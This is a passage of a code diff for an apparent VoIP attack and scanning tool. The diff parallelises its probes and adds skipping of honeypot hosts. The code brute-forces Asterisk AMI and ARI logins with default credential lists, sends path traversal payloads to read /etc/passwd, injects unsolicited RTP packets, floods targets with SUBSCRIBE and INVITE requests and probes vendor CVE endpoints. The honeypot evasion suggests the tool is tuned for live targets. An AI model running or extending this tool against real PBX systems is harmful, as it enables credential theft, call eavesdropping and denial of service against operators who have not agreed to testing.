-        resp = await udp_xfer(ip,port,rtcp,timeout=2)
+    results = await asyncio.gather(
+        *[udp_xfer(ip, port, rtcp, timeout=2) for port in RTCP_PORTS],
+        return_exceptions=True)
+    for port, resp in zip(RTCP_PORTS, results):
+        if isinstance(resp, Exception): continue
         if resp and len(resp)>=8:
             await st.finding(ip,"EXPOSURE",f"RTCP Port {port} Open","LOW",
                 "RTCP responding — session statistics may be exposed",
@@ -1829,10 +1970,11 @@ async def _rtcp_probe(ip,st):
 
 
 async def _rtp_port_range(ip,st):
-    open_cnt = 0
-    for p in RTP_SAMPLE:
-        if await udp_alive(ip,p,b"\x00\x00",timeout=1.5):
-            open_cnt += 1
+    results = await asyncio.gather(
+        *[udp_xfer(ip, p, b"\x00\x00", timeout=1.5) for p in RTP_SAMPLE],
+        return_exceptions=True,
+    )
+    open_cnt = sum(1 for r in results if isinstance(r, bytes) and r is not None)
     if open_cnt>=2:
         await st.finding(ip,"EXPOSURE","RTP Port Range Exposed","MEDIUM",
             f"{open_cnt} RTP ports reachable — restrict media range",
@@ -1853,8 +1995,12 @@ async def _rtp_inject(ip,st):
     ssrc    = random.randint(0,0xFFFFFFFF)
     rtp_hdr = struct.pack("!BBHII",0x80,0x00,1,0,ssrc)
     rtp_pkt = rtp_hdr + b"\x00"*160
-    for port in [16384,20000,10000]:
-        resp = await udp_xfer(ip,port,rtp_pkt,timeout=2)
+    ports   = [16384,20000,10000]
+    results = await asyncio.gather(
+        *[udp_xfer(ip, port, rtp_pkt, timeout=2) for port in ports],
+        return_exceptions=True)
+    for port, resp in zip(ports, results):
+        if isinstance(resp, Exception): continue
         if resp and len(resp)>10:
             await st.finding(ip,"EXPOSURE","Blind RTP Injection Accepted","MEDIUM",
                 f"UDP port {port} processed unsolicited RTP — enable SRTP",
@@ -1925,6 +2071,7 @@ async def phase7_stun_turn(state:State, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping STUN/TURN phase"); return
 
     async def stun_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_stun_amp(ip,state),      "stun_amp"),
             safe(_turn_relay(ip,state),    "turn_relay"),
@@ -2050,6 +2197,7 @@ async def phase8_iax2(state:State, sem:asyncio.Semaphore):
         Con.warn("No IAX2 targets — skipping"); return
 
     async def iax_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_iax2_poke(ip,state),        "iax_poke"),
             safe(_iax2_regreq(ip,state),      "iax_reg"),
@@ -2136,6 +2284,7 @@ async def phase9_mgcp_sccp_h323(state:State, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping legacy protocol tests"); return
 
     async def legacy_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_mgcp_probe(ip,state),    "mgcp"),
             safe(_mgcp_eplist(ip,state),   "mgcp_ep"),
@@ -2235,17 +2384,18 @@ async def _h323_enum(ip,st):
 # ══════════════════════════════════════════════════════════
 # PHASE 10 — TFTP Phone Provisioning
 # ══════════════════════════════════════════════════════════
-async def phase10_tftp(state:State, sem:asyncio.Semaphore):
+async def phase10_tftp(state:State, sess, sem:asyncio.Semaphore):
     Con.phase("PHASE 10 │ TFTP · PHONE PROVISIONING · AUTO-CONFIG HIJACKING")
     if not state.live_ips:
         Con.warn("No live hosts — skipping TFTP phase"); return
 
     async def tftp_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
-            safe(_tftp_probe(ip,state),         "tftp_probe"),
-            safe(_provision_paths(ip,state),    "provision"),
-            safe(_http_provision(ip,state),     "http_prov"),
-            safe(_dhcp_option_info(ip,state),   "dhcp_opt"),
+            safe(_tftp_probe(ip,state),              "tftp_probe"),
+            safe(_provision_paths(ip,state,sess),    "provision"),
+            safe(_http_provision(ip,state,sess),     "http_prov"),
+            safe(_dhcp_option_info(ip,state),        "dhcp_opt"),
         )
 
     await asyncio.gather(*[_sem_probe(sem, tftp_all, ip) for ip in state.live_ips])
@@ -2276,45 +2426,60 @@ async def _tftp_probe(ip,st):
             return
 
 
-async def _provision_paths(ip,st):
+async def _provision_paths(ip,st,sess):
     macs = [FAKE_MAC,"001565000001","0004f2000001","00026b000001"]
-    sess = new_session()
-    try:
-        for mac in macs:
-            for path_tpl in PHONE_PROVISION_PATHS:
-                path = path_tpl.replace("{mac}",mac).replace("{MAC}",mac.upper())
-                for proto,port in [("http",80),("http",8080),("https",443)]:
-                    c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=4)
-                    if c==200 and (re.search(r'sip|pbx|password|server|registrar',b,re.I)
-                                   or len(b)>200):
-                        await st.finding(ip,"EXPOSURE",
-                            f"Phone Provisioning Config Exposed: {path}","CRITICAL",
-                            "Provisioning file readable — may contain SIP credentials",
-                            f"{proto}://{ip}:{port}{path}")
-                        st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
-                        return
-    finally:
-        if sess and HAS_AIOHTTP:
-            await sess.close()
+
+    async def _probe(mac, path_tpl, proto, port):
+        path = path_tpl.replace("{mac}", mac).replace("{MAC}", mac.upper())
+        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
+        if c == 200 and (_SIP_CRED_RE.search(b) or len(b) > 200):
+            return path, proto, port, c
+        return None
+
+    protos_ports = [("http",80),("http",8080),("https",443)]
+    tasks = [
+        _probe(mac, path_tpl, proto, port)
+        for mac in macs
+        for path_tpl in PHONE_PROVISION_PATHS
+        for proto, port in protos_ports
+    ]
+    for fut in asyncio.as_completed(tasks):
+        result = await fut
+        if result:
+            path, proto, port, c = result
+            await st.finding(ip,"EXPOSURE",
+                f"Phone Provisioning Config Exposed: {path}","CRITICAL",
+                "Provisioning file readable — may contain SIP credentials",
+                f"{proto}://{ip}:{port}{path}")
+            st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
+            return
 
 
-async def _http_provision(ip,st):
-    sess = new_session()
-    try:
+async def _http_provision(ip,st,sess):
+    paths_protos = [
+        (path, proto, port)
         for path in ["/AutoProvision/","/provision/","/provision.php",
-                     "/cgi-bin/provision.cgi","/phones/config/"]:
-            for proto,port in [("http",80),("http",8080)]:
-                c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=4)
-                if c==200 and len(b) > 100:
-                    await st.finding(ip,"EXPOSURE",
-                        f"Auto-Provision Endpoint Open: {path}","HIGH",
-                        "Provisioning API accessible without auth",
-                        f"{proto}://{ip}:{port}{path}")
-                    st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
-                    return
-    finally:
-        if sess and HAS_AIOHTTP:
-            await sess.close()
+                     "/cgi-bin/provision.cgi","/phones/config/"]
+        for proto, port in [("http",80),("http",8080)]
+    ]
+
+    async def _probe(path, proto, port):
+        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
+        if c == 200 and len(b) > 100:
+            return path, proto, port, c
+        return None
+
+    results = await asyncio.gather(*[_probe(*pp) for pp in paths_protos],
+                                   return_exceptions=True)
+    for result in results:
+        if result and not isinstance(result, Exception):
+            path, proto, port, c = result
+            await st.finding(ip,"EXPOSURE",
+                f"Auto-Provision Endpoint Open: {path}","HIGH",
+                "Provisioning API accessible without auth",
+                f"{proto}://{ip}:{port}{path}")
+            st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
+            return
 
 
 async def _dhcp_option_info(ip,st):
@@ -2339,6 +2504,7 @@ async def phase11_auth(state:State, sess, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping auth phase"); return
 
     async def auth_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_digest_bypass(ip,state),     "digest_bp"),
             safe(_digest_capture(ip,state),    "digest_cap"),
@@ -2432,66 +2598,85 @@ async def _trunk_auth_bypass(ip,st):
 
 
 async def _ami_brute(ip,st):
-    """Async AMI brute-force using asyncio streams (no blocking sleep)."""
+    """Async AMI brute-force — parallel attempts with first-success early exit."""
     if not await tcp_open(ip, AMI_PORT, timeout=3.0):
         return
 
-    async def _try_ami(user: str, pwd: str) -> bool:
+    async def _try_ami(user: str, pwd: str) -> Optional[tuple]:
         try:
             r, w = await asyncio.wait_for(
-                asyncio.open_connection(ip, AMI_PORT), timeout=5.0)
-            # Read banner
-            banner = await asyncio.wait_for(r.read(256), timeout=3.0)
+                asyncio.open_connection(ip, AMI_PORT), timeout=4.0)
+            banner = await asyncio.wait_for(r.read(256), timeout=2.0)
             if b"Asterisk" not in banner and b"Call Manager" not in banner:
                 w.close()
-                return False
-            # Send login
+                return None
             login = f"Action: Login\r\nUsername: {user}\r\nSecret: {pwd}\r\n\r\n"
             w.write(login.encode())
             await w.drain()
-            # Read response
-            resp = await asyncio.wait_for(r.read(1024), timeout=3.0)
+            resp = await asyncio.wait_for(r.read(1024), timeout=2.0)
             try:
                 w.close()
-                await asyncio.wait_for(w.wait_closed(), timeout=1.0)
+                await asyncio.wait_for(w.wait_closed(), timeout=0.5)
             except Exception:
                 pass
-            return b"Response: Success" in resp
+            return (user, pwd) if b"Response: Success" in resp else None
         except Exception:
-            return False
+            return None
 
-    for user,pwd in AMI_CREDS:
-        ok = await _try_ami(user, pwd)
-        if ok:
+    # Run all credential attempts in parallel, grab first success
+    results = await asyncio.gather(*[_try_ami(u, p) for u, p in AMI_CREDS],
+                                   return_exceptions=True)
+    for result in results:
+        if result and not isinstance(result, Exception):
+            user, pwd = result
             await st.finding(ip,"CREDENTIAL",f"Asterisk AMI Login: {user}:{pwd}","CRITICAL",
                 "Full PBX control — run commands, intercept calls, read CDR",
                 f"tcp://{ip}:{AMI_PORT}")
             return
-        await asyncio.sleep(0.1)  # Brief rate-limit between attempts
 
 
 async def _ari_brute(ip,st,sess):
-    for user,pwd in ARI_CREDS:
-        for proto,port in [("http",8088),("https",8089)]:
-            c,b = await http_get(sess,f"{proto}://{ip}:{port}/ari/applications",
-                                 auth=(user,pwd),timeout=5)
-            if c==200 and re.search(r'(\[|\{|application)',b,re.I):
-                await st.finding(ip,"CREDENTIAL",f"Asterisk ARI Login: {user}:{pwd}","CRITICAL",
-                    "ARI full access — real-time call control, eavesdropping, CDR access",
-                    f"{proto}://{ip}:{port}/ari/")
-                return
+    combos = [(u, p, proto, port)
+              for u, p in ARI_CREDS
+              for proto, port in [("http",8088),("https",8089)]]
+
+    async def _probe(user, pwd, proto, port):
+        c, b = await http_get(sess, f"{proto}://{ip}:{port}/ari/applications",
+                              auth=(user, pwd), timeout=4)
+        if c==200 and re.search(r'(\[|\{|application)',b,re.I):
+            return user, pwd, proto, port
+        return None
+
+    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
+        result = await fut
+        if result:
+            user, pwd, proto, port = result
+            await st.finding(ip,"CREDENTIAL",f"Asterisk ARI Login: {user}:{pwd}","CRITICAL",
+                "ARI full access — real-time call control, eavesdropping, CDR access",
+                f"{proto}://{ip}:{port}/ari/")
+            return
 
 
 async def _ami_http(ip,st,sess):
-    for proto,port in [("http",8088),("https",8089)]:
-        for user,pwd in AMI_CREDS[:4]:
-            c,b = await http_get(sess,
-                f"{proto}://{ip}:{port}/rawman?action=Login&username={user}&secret={pwd}",
-                timeout=5)
-            if c==200 and "Response: Success" in b:
-                await st.finding(ip,"CREDENTIAL",f"AMI HTTP Login: {user}:{pwd}","CRITICAL",
-                    "AMI-over-HTTP accepted",f"{proto}://{ip}:{port}/rawman")
-                return
+    combos = [(proto, port, u, p)
+              for proto, port in [("http",8088),("https",8089)]
+              for u, p in AMI_CREDS[:4]]
+
+    async def _probe(proto, port, user, pwd):
+        c, b = await http_get(sess,
+            f"{proto}://{ip}:{port}/rawman?action=Login&username={user}&secret={pwd}",
+            timeout=4)
+        if c==200 and "Response: Success" in b:
+            return user, pwd, proto, port
+        return None
+
+    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
+        result = await fut
+        if result:
+            user, pwd, proto, port = result
+            await st.finding(ip,"CREDENTIAL",f"AMI HTTP Login: {user}:{pwd}","CRITICAL",
+                "AMI-over-HTTP accepted",f"{proto}://{ip}:{port}/rawman")
+            return
 
 
 async def _stir_shaken(ip,st):
@@ -2519,6 +2704,7 @@ async def phase12_dos(state:State, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping DoS phase"); return
 
     async def dos_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_invite_flood(ip,state),       "invite_flood"),
             safe(_register_flood(ip,state),     "reg_flood"),
@@ -2612,12 +2798,14 @@ async def _malformed_sdp(ip,st):
 async def _subscribe_bomb(ip,st):
     events = ["presence","dialog","message-summary","reg","call-info",
               "ua-profile","voicemail","conference","spirits-INDPs","check-sync"]
-    answered = 0
-    for ev in events:
+
+    async def _probe(ev):
         extra = f"Event: {ev}\r\nExpires: 3600\r\n"
         resp  = await sip_probe(ip,5060,sip_msg("SUBSCRIBE",ip,extra_hdrs=extra),timeout=3)
-        if resp and re.search(r"SIP/2\.0 200 OK",resp):
-            answered += 1
+        return bool(resp and re.search(r"SIP/2\.0 200 OK",resp))
+
+    results = await asyncio.gather(*[_probe(ev) for ev in events], return_exceptions=True)
+    answered = sum(1 for r in results if r is True)
     if answered>=5:
         await st.finding(ip,"EXPOSURE","SUBSCRIBE Bomb — Multiple Event Packages Accepted","MEDIUM",
             f"{answered}/10 SUBSCRIBE event types accepted without auth — resource exhaustion",
@@ -2662,6 +2850,7 @@ async def phase13_snmp_mgmt(state:State, sess, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping management phase"); return
 
     async def mgmt_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_snmp_brute(ip,state),        "snmp"),
             safe(_path_traversal(ip,state,sess),"path_trav"),
@@ -2763,12 +2952,14 @@ async def _snmp_brute(ip,st):
                 return community, desc
         return community, ""
 
-    # Test communities in batches of 5 for speed
-    communities = SNMP_COMMUNITIES
-    for i in range(0, len(communities), 5):
-        batch = communities[i:i+5]
-        results = await asyncio.gather(*[_try_community(c) for c in batch])
-        for community, desc in results:
+    # Test all communities in parallel for maximum speed
+    results = await asyncio.gather(
+        *[_try_community(c) for c in SNMP_COMMUNITIES],
+        return_exceptions=True,
+    )
+    for item in results:
+        if isinstance(item, tuple):
+            community, desc = item
             if desc:
                 await st.finding(ip,"MISCONFIGURATION",
                     f"SNMP Community '{community}' Valid — sysDescr: {desc[:60]}","HIGH",
@@ -2785,18 +2976,33 @@ async def _path_traversal(ip,st,sess):
         "/config?file=../../../../etc/passwd",
         "/download?name=../../../etc/passwd",
     ]
-    for path in traversals:
-        for proto,port in [("http",80),("https",443),("http",8080)]:
-            c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=5)
-            if c and FILE_READ_PATTERNS.search(b):
-                await st.finding(ip,"CVE-2020-3381","Path Traversal — /etc/passwd Readable",
-                    "CRITICAL",f"LFI confirmed via {path}",f"{proto}://{ip}:{port}{path}")
-                return
+    combos = [(path, proto, port)
+              for path in traversals
+              for proto, port in [("http",80),("https",443),("http",8080)]]
+
+    async def _probe(path, proto, port):
+        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
+        if c and FILE_READ_PATTERNS.search(b):
+            return path, proto, port
+        return None
+
+    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
+        result = await fut
+        if result:
+            path, proto, port = result
+            await st.finding(ip,"CVE-2020-3381","Path Traversal — /etc/passwd Readable",
+                "CRITICAL",f"LFI confirmed via {path}",f"{proto}://{ip}:{port}{path}")
+            return
 
 
 async def _dir_listing(ip,st,sess):
-    for path in ["/admin/","/config/","/logs/","/backup/","/recordings/"]:
-        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
+    paths = ["/admin/","/config/","/logs/","/backup/","/recordings/"]
+    results = await asyncio.gather(
+        *[http_get(sess, f"http://{ip}{p}", timeout=3) for p in paths],
+        return_exceptions=True)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c==200 and re.search(r'Index of|<listing>|\bparent directory\b',b,re.I):
             await st.finding(ip,"INFO-DISCLOSURE",f"Directory Listing at {path}","MEDIUM",
                 f"Directory listing exposed at http://{ip}{path}",f"http://{ip}{path}")
@@ -2804,23 +3010,39 @@ async def _dir_listing(ip,st,sess):
 
 
 async def _exposed_backup(ip,st,sess):
-    for path in ["/backup.tar.gz","/asterisk.conf.bak",
-                 "/sip.conf.bak","/freepbx.bak",
-                 "/admin/download.php?file=sip.conf",
-                 "/config.bak","/voip.bak"]:
-        for proto,port in [("http",80),("https",443)]:
-            c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",timeout=5)
-            if c==200 and (len(b)>500 or re.search(r'secret|password|username|passwd',b,re.I)):
-                await st.finding(ip,"EXPOSURE",f"Backup File Accessible: {path}","CRITICAL",
-                    "Backup file contains credentials/config",f"{proto}://{ip}:{port}{path}")
-                return
+    _CRED_RE = re.compile(r'secret|password|username|passwd', re.I)
+    combos = [(path, proto, port)
+              for path in ["/backup.tar.gz","/asterisk.conf.bak",
+                           "/sip.conf.bak","/freepbx.bak",
+                           "/admin/download.php?file=sip.conf",
+                           "/config.bak","/voip.bak"]
+              for proto, port in [("http",80),("https",443)]]
+
+    async def _probe(path, proto, port):
+        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
+        if c==200 and (len(b)>500 or _CRED_RE.search(b)):
+            return path, proto, port
+        return None
+
+    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
+        result = await fut
+        if result:
+            path, proto, port = result
+            await st.finding(ip,"EXPOSURE",f"Backup File Accessible: {path}","CRITICAL",
+                "Backup file contains credentials/config",f"{proto}://{ip}:{port}{path}")
+            return
 
 
 async def _api_info_leak(ip,st,sess):
-    for path in ["/api/v1/info","/api/info","/status","/health",
-                 "/api/v1/system","/metrics"]:
-        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c==200 and re.search(r'"(version|build|serial|mac|hostname|uptime)"',b,re.I):
+    paths = ["/api/v1/info","/api/info","/status","/health","/api/v1/system","/metrics"]
+    _INFO_RE = re.compile(r'"(version|build|serial|mac|hostname|uptime)"', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, f"http://{ip}{p}", timeout=3) for p in paths],
+        return_exceptions=True)
+    for path, res in zip(paths, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c==200 and _INFO_RE.search(b):
             await st.finding(ip,"INFO-DISCLOSURE","API Info Endpoint Exposed","LOW",
                 f"System info at http://{ip}{path}",f"http://{ip}{path}")
             return
@@ -2834,6 +3056,7 @@ async def phase14_vendor(state:State, sess, sem:asyncio.Semaphore):
         Con.warn("No live hosts — skipping vendor phase"); return
 
     async def vendor_all(ip:str):
+        if ip in state.honeypot_ips: return
         await asyncio.gather(
             safe(_v_cisco_cucm(ip,state,sess),      "cisco_cucm"),
             safe(_v_avaya_full(ip,state,sess),      "avaya"),
@@ -2857,47 +3080,67 @@ async def phase14_vendor(state:State, sess, sem:asyncio.Semaphore):
 
 
 async def _v_cisco_cucm(ip,st,sess):
-    for path,cve in [
+    paths_cves = [
         ("/ccmadmin/showAdminPasswordPage.do","CVE-2021-1397"),
         ("/ccmadmin/platformConfigMenu.do","CVE-2022-20804"),
         ("/ccmadmin/uploadFile.do","CVE-2022-20812"),
         ("/ccmservice/","CVE-2022-31601"),
-    ]:
-        c,b = await http_get(sess,f"https://{ip}:8443{path}",timeout=5)
-        if c and c not in (404,000) and re.search(r'cisco|cucm|callmanager',b,re.I):
-            await st.finding(ip,cve,CVE_DB.get(cve,("Cisco CUCM","HIGH"))[0],
-                CVE_DB.get(cve,("","HIGH"))[1],
-                f"Cisco CUCM path accessible at {path}",f"https://{ip}:8443{path}")
-            return
-    c,b = await http_get(sess,
-        f"https://{ip}/CGI/Java/Serviceability?adapter=device.statistics.device",timeout=5)
-    if c==200 and re.search(r'cisco|phone|sep',b,re.I):
-        await st.finding(ip,"CVE-2020-3161","Cisco IP Phone HTTP Interface","CRITICAL",
-            "Phone web service reachable — RCE on 7800/8800",f"https://{ip}/CGI/")
+    ]
+    _CISCO_RE = re.compile(r'cisco|cucm|callmanager', re.I)
+    urls = [f"https://{ip}:8443{path}" for path, _ in paths_cves]
+    urls.append(f"https://{ip}/CGI/Java/Serviceability?adapter=device.statistics.device")
+    results = await asyncio.gather(*[http_get(sess, u, timeout=4) for u in urls],
+                                   return_exceptions=True)
+    for i, (url, res) in enumerate(zip(urls, results)):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if i < len(paths_cves):
+            path, cve = paths_cves[i]
+            if c and c not in (404,) and _CISCO_RE.search(b):
+                await st.finding(ip,cve,CVE_DB.get(cve,("Cisco CUCM","HIGH"))[0],
+                    CVE_DB.get(cve,("","HIGH"))[1],
+                    f"Cisco CUCM path accessible at {path}",url)
+                return
+        else:
+            if c==200 and re.search(r'cisco|phone|sep',b,re.I):
+                await st.finding(ip,"CVE-2020-3161","Cisco IP Phone HTTP Interface","CRITICAL",
+                    "Phone web service reachable — RCE on 7800/8800",f"https://{ip}/CGI/")
 
 
 async def _v_avaya_full(ip,st,sess):
-    for url,cve,title,sev in [
+    entries = [
         (f"https://{ip}/WebManagement/","CVE-2021-22502","Avaya Aura RCE","CRITICAL"),
         (f"https://{ip}/one-x/","CVE-2020-7043","Avaya Session Manager XXE","HIGH"),
         (f"http://{ip}:8443/SessionManager/","CVE-2020-7043","Avaya SM XXE","HIGH"),
         (f"https://{ip}/avaya/","CVE-2018-15614","Avaya IP Office","CRITICAL"),
-    ]:
-        c,b = await http_get(sess,url,timeout=5)
-        if c and re.search(r'avaya|session.manager|one-x',b,re.I):
+    ]
+    _AVAYA_RE = re.compile(r'avaya|session.manager|one-x', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, url, timeout=4) for url, *_ in entries],
+        return_exceptions=True)
+    for (url,cve,title,sev), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c and _AVAYA_RE.search(b):
             await st.finding(ip,cve,title,sev,f"Avaya interface at {url}",url)
             return
 
 
 async def _v_grandstream_full(ip,st,sess):
-    for url,cve in [
+    entries = [
         (f"http://{ip}:8089/cgi-bin/api.values.get","CVE-2022-37397"),
         (f"http://{ip}:8089/cgi-bin/api-sys_performance.cgi","CVE-2020-5736"),
         (f"http://{ip}:80/cgi-bin/ConfigManApp.com","CVE-2019-10660"),
-    ]:
-        c,b = await http_get(sess,url,timeout=5)
-        if c==200 and re.search(r'grandstream|ucm|GVC|GXP',b,re.I) \
-                and re.search(r'(response|result|value|system)',b,re.I):
+    ]
+    _GS_RE   = re.compile(r'grandstream|ucm|GVC|GXP', re.I)
+    _RESP_RE = re.compile(r'response|result|value|system', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, url, timeout=4) for url, _ in entries],
+        return_exceptions=True)
+    for (url,cve), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c==200 and _GS_RE.search(b) and _RESP_RE.search(b):
             title,sev = CVE_DB.get(cve,("Grandstream Vuln","CRITICAL"))
             await st.finding(ip,cve,title,sev,"Grandstream API returns data without auth",url)
 
@@ -2916,12 +3159,18 @@ async def _v_polycom_full(ip,st,sess):
 
 
 async def _v_yealink_full(ip,st,sess):
-    for url,cve in [
+    entries = [
         (f"https://{ip}/api/v1/accounts","CVE-2021-27561"),
         (f"http://{ip}:8080/api/v1/","CVE-2021-27562"),
-    ]:
-        c,b = await http_get(sess,url,timeout=5)
-        if c==200 and re.search(r'yealink|account',b,re.I):
+    ]
+    _YL_RE = re.compile(r'yealink|account', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, url, timeout=4) for url, _ in entries],
+        return_exceptions=True)
+    for (url,cve), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c==200 and _YL_RE.search(b):
             t,s = CVE_DB.get(cve,("Yealink","CRITICAL"))
             await st.finding(ip,cve,t,s,"Yealink API without auth",url)
             return
@@ -2933,19 +3182,24 @@ async def _v_yealink_full(ip,st,sess):
 
 
 async def _v_freepbx_full(ip,st,sess):
-    # Confirm FreePBX first
-    c0,b0 = await http_get(sess,f"http://{ip}/admin/",timeout=5)
+    c0,b0 = await http_get(sess,f"http://{ip}/admin/",timeout=4)
     if not (c0 and re.search(r'freepbx|sangoma',b0,re.I)):
         return
-    for path,cve in [
+    entries = [
         ("/admin/ajax.php?module=framework&command=checkDependencies","CVE-2022-26272"),
         ("/admin/ajax.php?module=userman&command=getAll","CVE-2020-36166"),
         ("/admin/config.php?display=phonebook&view=default","CVE-2023-49786"),
         ("/admin/modules.php","CVE-2019-11334"),
-    ]:
-        c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c==200 and re.search(r'(json|result|success|module)',b,re.I) \
-                and not re.search(r'(login|password)',b,re.I):
+    ]
+    _FPBX_OK  = re.compile(r'json|result|success|module', re.I)
+    _FPBX_BAD = re.compile(r'login|password', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, f"http://{ip}{path}", timeout=4) for path, _ in entries],
+        return_exceptions=True)
+    for (path,cve), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c==200 and _FPBX_OK.search(b) and not _FPBX_BAD.search(b):
             t,s = CVE_DB.get(cve,("FreePBX RCE","CRITICAL"))
             await st.finding(ip,cve,t,s,"FreePBX endpoint returns data without auth",
                 f"http://{ip}{path}")
@@ -2953,12 +3207,17 @@ async def _v_freepbx_full(ip,st,sess):
 
 
 async def _v_3cx_full(ip,st,sess):
-    for url,cve in [
+    entries = [
         (f"http://{ip}:5000/webclient","CVE-2021-26260"),
         (f"https://{ip}:5001/api/v1/status","CVE-2023-29059"),
         (f"http://{ip}:5000/api/v1/status","CVE-2023-29059"),
-    ]:
-        c,b = await http_get(sess,url,timeout=5)
+    ]
+    results = await asyncio.gather(
+        *[http_get(sess, url, timeout=4) for url, _ in entries],
+        return_exceptions=True)
+    for (url,cve), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c==200 and re.search(r'3cx|phonesystem',b,re.I):
             t,s = CVE_DB.get(cve,("3CX","CRITICAL"))
             await st.finding(ip,cve,t,s,"3CX detected — verify auth bypass",url)
@@ -2966,11 +3225,16 @@ async def _v_3cx_full(ip,st,sess):
 
 
 async def _v_elastix_full(ip,st,sess):
-    for path,cve in [
+    entries = [
         ("/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action=","CVE-2012-4869"),
         ("/modules/admin/index.php","CVE-2012-1233"),
-    ]:
-        c,b = await http_get(sess,f"https://{ip}{path}",timeout=5)
+    ]
+    results = await asyncio.gather(
+        *[http_get(sess, f"https://{ip}{path}", timeout=4) for path, _ in entries],
+        return_exceptions=True)
+    for (path,cve), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
         if c and FILE_READ_PATTERNS.search(b):
             t,s = CVE_DB.get(cve,("Elastix","CRITICAL"))
             await st.finding(ip,cve,t+" — LFI Confirmed",s,
@@ -2985,13 +3249,19 @@ async def _v_elastix_full(ip,st,sess):
 
 
 async def _v_mitel_full(ip,st,sess):
-    for path,cve,sev in [
+    entries = [
         ("/aastra/","CVE-2022-29499","CRITICAL"),
         ("/micollab/client/login","CVE-2021-32077","HIGH"),
         ("/micontact/","CVE-2019-16922","HIGH"),
-    ]:
-        c,b = await http_get(sess,f"https://{ip}{path}",timeout=5)
-        if c and re.search(r'mitel|mivoice|micollab|aastra',b,re.I):
+    ]
+    _MITEL_RE = re.compile(r'mitel|mivoice|micollab|aastra', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, f"https://{ip}{path}", timeout=4) for path, *_ in entries],
+        return_exceptions=True)
+    for (path,cve,sev), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c and _MITEL_RE.search(b):
             t,_ = CVE_DB.get(cve,("Mitel","CRITICAL"))
             await st.finding(ip,cve,t,sev,f"Mitel at https://{ip}{path}",
                 f"https://{ip}{path}")
@@ -2999,34 +3269,51 @@ async def _v_mitel_full(ip,st,sess):
 
 
 async def _v_kamailio_full(ip,st,sess):
-    for url,cve in [
+    entries = [
         (f"http://{ip}:8080/mi","CVE-2022-44877"),
         (f"http://{ip}:8000/RPC2","CVE-2021-25956"),
         (f"http://{ip}:8888/mi","CVE-2022-44877"),
-    ]:
-        c,b = await http_get(sess,url,
-            data='{"jsonrpc":"2.0","method":"core.info","id":1}',
-            headers={"Content-Type":"application/json"},timeout=5)
-        if c==200 and re.search(r'"id"\s*:\s*1',b) \
-                and re.search(r'kamailio|opensips|version',b,re.I):
+    ]
+    _KAM_PAYLOAD = '{"jsonrpc":"2.0","method":"core.info","id":1}'
+    _KAM_RE = re.compile(r'kamailio|opensips|version', re.I)
+    results = await asyncio.gather(
+        *[http_get(sess, url, data=_KAM_PAYLOAD, headers={"Content-Type":"application/json"},
+                   timeout=4) for url, _ in entries],
+        return_exceptions=True)
+    for (url,cve), res in zip(entries, results):
+        if isinstance(res, Exception): continue
+        c, b = res
+        if c==200 and re.search(r'"id"\s*:\s*1',b) and _KAM_RE.search(b):
             t,s = CVE_DB.get(cve,("Kamailio MI","CRITICAL"))
             await st.finding(ip,cve,t,s,"MI API responded to core.info without auth",url)
             return
 
 
 async def _v_nec(ip,st,sess):
-    for path in ["/nec/","/sv9100/","/univerge/"]:
-        c,b = await http_get(sess,f"https://{ip}{path}",timeout=5)
-        if c and re.search(r'nec|sv9100|univerge|sv8100',b,re.I):
+    paths = ["/nec/","/sv9100/","/univerge/"]
+    _NEC_RE = re.compile(r'nec|sv9100|univerge|sv8100', re.I)
+    results = await asyncio.gather(
